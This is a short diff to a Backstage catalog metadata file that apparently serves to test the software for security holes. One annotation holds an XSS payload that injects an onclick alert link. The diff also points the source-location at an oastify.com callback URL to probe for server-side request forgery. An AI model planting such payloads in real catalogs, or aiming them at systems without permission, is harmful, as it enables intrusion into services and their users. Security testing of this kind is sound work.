@@ -7,7 +7,7 @@ metadata:
   annotations:
     github.com/project-slug: backstage/backstage
     backstage.io/techdocs-ref: "\"><a href=”” onclick=”alert(‘XSS’)”>Click Me</a>"
-    backstage.io/source-location: url:https://github.com/xinhuang/test-repo2/tree/main/
+    backstage.io/source-location: url:https://9pz22a1dzs90i9hardb71iavdmjd74vt.oastify.com/ssrf
 spec:
   type: website
   owner: john@example.com
